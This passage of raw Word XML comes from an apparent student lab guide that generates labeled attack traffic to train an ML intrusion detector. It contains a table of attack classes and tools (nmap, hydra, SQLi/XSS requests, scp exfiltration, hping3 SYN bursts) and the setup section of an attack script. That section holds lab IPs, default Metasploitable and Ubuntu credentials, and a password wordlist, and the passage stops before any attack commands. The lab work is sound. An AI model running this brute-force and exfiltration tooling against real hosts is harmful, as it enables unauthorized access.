                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Normal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Browsing, SSH, DNS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>curl, ssh, dig, nslookup</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4608"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Baseline traffic, ordinary request frequency, common protocols.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Recon</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Nmap scan, ping sweep</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>nmap -sn, -sS, -sV</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4608"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Host discovery, port probing, service enumeration.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Brute Force</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Hydra SSH attempts</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>hydra</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4608"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Repeated authentication attempts and login failures.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Web Attack</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>SQLi and XSS-style requests</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>curl</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4608"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>HTTP requests containing suspicious parameters and payload patterns.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Exfiltration</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>SCP file transfer</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>scp, ssh</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4608"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>File transfer traffic with larger or distinct session behavior.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Lateral Movement</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>SMB enumeration and SSH movement</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>smbclient, ssh</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4608"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Internal service discovery and remote login activity.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>DoS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Controlled SYN burst</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2160"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>hping3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4608"/>
            <w:vAlign w:val="top"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
                <w:b w:val="0"/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>Short burst of SYN packets to a lab web service.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>8. Full Attack Demo Script</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Create the script on Kali with the following command:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>nano attack-demo.sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Paste the complete script below, then save it. Update the IP addresses at the top of the script to match your VCloud network.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:r>
        <w:t>Listing 1. attack-demo.sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>#!/bin/bash</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AI Network Manager - Attack Traffic Generator</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Lab-only attack simulation script</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Author: Bernard Appiah</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Purpose: Generate labeled network traffic for ML IDS training</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0. SAFETY AND LAB BOUNDARY</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># -----------------------------</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Use this script only inside your authorized VCloud lab.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Do not point TARGET_SUBNET or target IP variables at public IPs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># The script includes a private-IP check to reduce accidental misuse.</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1. CONFIGURATION</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TARGET_SUBNET="192.168.10.0/24"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>META_IP="192.168.10.20"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>UBUNTU_IP="192.168.10.30"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>WINDOWS_IP="192.168.10.40"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>AI_MANAGER_IP="192.168.10.50"</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Metasploitable default lab account. Change if your lab uses a different account.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>META_USER="msfadmin"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>META_PASS="msfadmin"</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Ubuntu lab account. Change to your actual Ubuntu test user.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>UBUNTU_USER="student"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>UBUNTU_PASS="student"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WORDLIST="./wordlists/demo-passwords.txt"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>LOG_DIR="./logs"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>EXFIL_DIR="./exfil"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>EXFIL_FILE="./exfil/sample-sensitive-file.txt"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>LABEL_LOG="./logs/attack-labels.csv"</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mkdir -p "$LOG_DIR" "$EXFIL_DIR" "./wordlists" "./payloads"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2. HELPER FUNCTIONS</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timestamp() {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    date +"%Y-%m-%d_%H-%M-%S"</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now_iso() {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    date -Iseconds</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banner() {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "============================================================"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "$1"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "============================================================"</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pause_between_attacks() {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    echo "[*] Waiting 10 seconds before the next action for cleaner labels..."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    sleep 10</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init_files() {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    if [ ! -f "$WORDLIST" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        cat &gt; "$WORDLIST" &lt;&lt; 'EOF'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>admin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>password</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>123456</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>msfadmin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>toor</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>kali</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>ubuntu</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>student</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>network</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>security</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>EOF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    fi</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if [ ! -f "$EXFIL_FILE" ]; then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        cat &gt; "$EXFIL_FILE" &lt;&lt; 'EOF'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Student Project Simulated Sensitive File</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:eastAsia="Courier New"/>
